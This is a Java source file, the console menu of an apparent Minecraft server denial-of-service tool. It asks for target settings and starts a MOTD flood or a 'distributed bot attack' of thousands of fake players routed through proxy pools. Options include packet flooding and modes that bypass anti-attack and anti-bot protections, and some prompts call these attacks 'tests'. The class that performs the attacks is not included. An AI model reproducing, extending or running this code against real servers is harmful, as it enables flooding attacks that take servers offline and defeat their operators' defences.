package co.akarin.endminecraftultra.main;


import java.util.HashMap;
import java.util.Scanner;

import static co.akarin.endminecraftultra.utils.mainUtils.getCo;
import static co.akarin.endminecraftultra.utils.mainUtils.log;
import co.akarin.endminecraftultra.proxy.ProxyPool;
import co.akarin.endminecraftultra.ATTACK.DistributedBotAttack;
import co.akarin.endminecraftultra.ATTACK.IAttack;
import co.akarin.endminecraftultra.ATTACK.MotdAttack;

public class Menu {
    private String ip;
    private Scanner scanner;
    private int port;

    public Menu(Scanner sc, String ip, int port) {
        this.ip = ip;
        this.port = port;
        this.scanner = sc;
    }

    public void _1() {
        log("MOTD测试");
        log("请输入持续时间(单位：秒)(默认60)");
        int time = getCo(scanner.nextLine(),60);
        log("请输入线程数(默认16)");
        int thread = getCo(scanner.nextLine(),16);
        IAttack attack = new MotdAttack(time,thread,0,false,false,null);
        attack.start(ip, port);
    }
    public void antiAttiackMode(){
        getProxy();
        IAttack attack = new DistributedBotAttack(Integer.MAX_VALUE,Integer.MAX_VALUE,650,true,true,true, new HashMap<>(),true);
        attack.start(ip, port);
    }
    public void _2() {
        log("配置选择：1-自定义,2-Antiattack");
        switch (getCo(scanner.nextLine(),1)) {
            case 1:custom(); break;
            case 2: antiAttiackMode(); break;
            default: custom();
        }
    }
    public void custom(){
        log("分布式假人测试", "请输入测试时长！(默认3600s)");
        int time = getCo(scanner.nextLine(),3600);
        log("请输入最大连接数(默认10000)");
        int maxAttack = getCo(scanner.nextLine(),10000);
        log("请输入每次加入服务器间隔(ms)");
        int sleepTime = getCo(scanner.nextLine(),0);
        log("请输入是否开启TAB测试 y/n，默认关闭(n)");
        boolean tab = getCo(scanner.nextLine(),"n").equals("y");
        log("请输入是否开启AntiAttackRL绕过功能 y/n，默认关闭(n)");
        boolean lele = getCo(scanner.nextLine(),"n").equals("y");
        log("Enable packet flood? y/n,default(n)");
        boolean packet = getCo(scanner.nextLine(),"n").equals("y");
        log("Enable antiAntiBot mode? y/n,default(n)");
        boolean antiAntiBot = getCo(scanner.nextLine(),"n").equals("y");
        getProxy();
        IAttack attack = new DistributedBotAttack(time,maxAttack,sleepTime,lele,tab,packet, new HashMap<>(),antiAntiBot);
        attack.start(ip, port);
    }
    public void getProxy() {
        log("请输入代理ip列表获取方式（1）： 1.通过API获取 2.通过本地(http.txt)获取 3.通过本地+API获取");
        switch (getCo(scanner.nextLine(),1)) {
            case 1:
                ProxyPool.getProxysFromAPIs();
                ProxyPool.runUpdateProxysTask(1200);
                break;
            case 2:
                ProxyPool.getProxysFromFile();
                break;
            case 3:
                ProxyPool.getProxysFromFile();
                ProxyPool.getProxysFromAPIs();
                ProxyPool.runUpdateProxysTask(1200);
                break;
            default:
                ProxyPool.getProxysFromAPIs();
                ProxyPool.runUpdateProxysTask(1200);
        }
    }
}
